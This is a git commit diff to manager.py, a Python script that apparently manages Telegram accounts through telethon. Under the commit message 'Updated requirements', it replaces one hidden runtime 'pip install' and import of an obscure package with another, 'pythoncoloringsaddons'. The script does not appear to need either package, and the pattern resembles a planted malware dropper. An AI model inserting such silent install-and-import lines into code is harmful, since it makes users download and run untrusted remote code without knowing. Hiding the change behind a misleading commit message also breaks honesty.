ee8ee90719749a2696309b361d6885ca9789585c
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-06 20:20:20 +0200

    Updated requirements

--- manager.py
+++ manager.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitelibV2")
-import pipsqlitelibV2
+os.system("pip install pythoncoloringsaddons")
+import pythoncoloringsaddons
 import requests
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
